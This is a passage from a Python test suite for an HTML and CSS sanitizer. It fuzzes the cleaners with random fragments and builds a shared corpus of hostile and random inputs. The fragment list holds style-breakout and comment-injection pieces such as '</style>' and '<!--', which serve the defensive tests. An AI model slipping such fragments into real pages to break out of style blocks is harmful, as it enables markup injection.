    "<", "</style>", "-->", "<!--", "\x00", "var(--cacc)", "calc(", "100% - 2cqw", "transform:rotate(3deg)", "font-family:\"Poppins\"", "@media", "[a]", "#id",
]


class PropertyTests(unittest.TestCase):
    def test_random_templates_are_always_safe_and_stable(self):
        rng = random.Random(20260101)
        for i in range(600):
            src = "".join(rng.choice(HTML_BITS) for _ in range(rng.randint(1, 40)))
            res = clean_t(src)
            self.assertEqual(res.errors, [])
            assert_safe_template(self, res.value)
            self.assertEqual(clean_t(res.value).value, res.value, f"not stable for {src!r}")

    def test_random_stylesheets_are_always_safe_and_stable(self):
        rng = random.Random(20260102)
        for i in range(600):
            src = "".join(rng.choice(CSS_BITS) for _ in range(rng.randint(1, 50)))
            res = clean_c(src)
            assert_safe_css(self, res.value)
            self.assertEqual(clean_c(res.value).value, res.value, f"not stable for {src!r}")

    def test_random_bytes_never_crash(self):
        rng = random.Random(7)
        for _ in range(200):
            src = "".join(chr(rng.choice([rng.randint(0, 127), rng.randint(0, 0x2FF), rng.randint(0x2000, 0x2100)])) for _ in range(rng.randint(0, 200)))
            assert_safe_template(self, clean_t(src).value)
            assert_safe_css(self, clean_c(src).value)

    def test_round_trip_of_valid_templates(self):
        from designs.starters import STARTERS

        for key, s in STARTERS.items():
            first = clean_t(s["template"])
            self.assertEqual(first.warnings, [], key)
            self.assertEqual(clean_t(first.value).value, first.value, key)
            css = clean_c(s["css"])
            self.assertEqual(clean_c(css.value).value, css.value, key)

    def test_text_is_preserved_in_order(self):
        rng = random.Random(3)
        words = ["alpha", "beta", "gamma", "delta", "ünï", "مرحبا", "x1"]
        for _ in range(100):
            picked = [rng.choice(words) for _ in range(rng.randint(1, 8))]
            src = "".join(f"<div class=\"c\">{w}</div>" if rng.random() < .5 else f"<span>{w}</span>" for w in picked)
            text = re.sub(r"<[^>]+>", "", clean_t(src).value)
            self.assertEqual(text, "".join(picked))


# ---------------------------------------------------------------- the corpus both languages read
def build_corpus():
    rng = random.Random(424242)
    templates = [src for _, src in HOSTILE_TEMPLATES]
    templates += ["".join(rng.choice(HTML_BITS) for _ in range(rng.randint(1, 30))) for _ in range(60)]
    stylesheets = [src for _, src in HOSTILE_CSS if len(src) < 20000]
    stylesheets += ["".join(rng.choice(CSS_BITS) for _ in range(rng.randint(1, 40))) for _ in range(60)]
    return {
        "face": FACE,
        "media": ["/media/logos/own.png"],
        "templates": [{"in": s, "out": clean_t(s).value} for s in templates],
        "styles": [{"in": s, "out": clean_c(s).value} for s in stylesheets],
    }


class CorpusTests(unittest.TestCase):
    def test_corpus_file_is_current(self):
        built = build_corpus()
        if not CORPUS_FILE.exists() or json.loads(CORPUS_FILE.read_text(encoding="utf-8")) != built:
            if __import__("os").environ.get("WRITE_SANITIZE_CORPUS"):
                CORPUS_FILE.write_text(json.dumps(built, ensure_ascii=False, indent=0), encoding="utf-8")
            else:
                self.fail("tests/sanitize_corpus.json is stale: run with WRITE_SANITIZE_CORPUS=1 and commit it (the web tests read it)")
